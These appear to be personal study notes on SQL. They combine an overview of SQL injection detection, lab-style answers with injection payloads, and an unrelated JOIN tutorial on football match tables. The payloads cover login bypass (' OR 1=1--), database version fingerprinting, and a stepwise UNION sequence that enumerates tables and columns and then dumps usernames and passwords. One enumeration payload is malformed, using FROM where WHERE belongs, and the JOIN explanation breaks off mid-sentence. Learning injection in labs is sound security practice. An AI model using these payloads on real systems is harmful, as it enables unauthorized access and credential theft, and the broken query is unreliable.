=>How to detect SQL injection vulnerabilities------------
You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

The single quote character ' and look for errors or other anomalies.
Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.


=> How to combine two table into one horizontally with a single query with a 'JOIN'

--------------------Game Table--------------------

id	mdate	stadium	team1	team2
1001	8 June 2012	National Stadium, Warsaw	POL	GRE
1002	8 June 2012	Stadion Miejski (Wroclaw)	RUS	CZE
1003	12 June 2012	Stadion Miejski (Wroclaw)	GRE	CZE
1004	12 June 2012	National Stadium, Warsaw	POL	RUS


-------------------Goal Table --------------------

matchid	teamid	player	gtime
1001	POL	Robert Lewandowski	17
1001	GRE	Dimitris Salpingidis	51
1002	RUS	Alan Dzagoev	15
1002	RUS	Roman Pavlyuchenko	82




SELECT player, teamid, stadium, mdate FROM game JOIN goal ON (id = matchid)
  WHERE teamid= 'GRE';


The FROM clause says to merge data from the goal table with that from the game table. The ON says how to figure out which rows in game go with which rows in goal-the matchid from goal must match id
from game. (If we wanted to be more clear/specific we could say.

Question:1 SQL injection vulnerability allowing login bypass.
Answer: ' OR 1=1--

Question:2 SQL injection attack, querying the database type and version on Oracle
Answer: ' UNION SELECT 'abc', NULL FROM dual-- (To check the table column)
'UNION SELECT banner, NULL FROM v$version-- (Get the database's version)

Question:3 SQL injection attack, querying the database type and version on MySQL and Microsoft
Answer: ' order by 1 (it's means 1 column exist)
-- or # (Both are being used for comment out the content in MySQL and Microsoft SQL)

' UNION SELECT @@version, NULL#

---------------How to find tables and columns through payload in SQL-----------

1=> First verify the number of columns
' UNION SELECT NULL,NULL--

2=> Determine the tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

3=> Determine the columns
' UNION SELECT column_name,NULL FROM information_schema.columns FROM table_name='user_abcd'--

4=> Determine the username and password
' UNION SELECT username, password FROM user_abcd--


Step 2 will displays all database's tables through 'information_schema.tables' payload. Moreover, step 3 will do the same thing returns all columns. Lastly, Step 4 will return username and password
from specific table.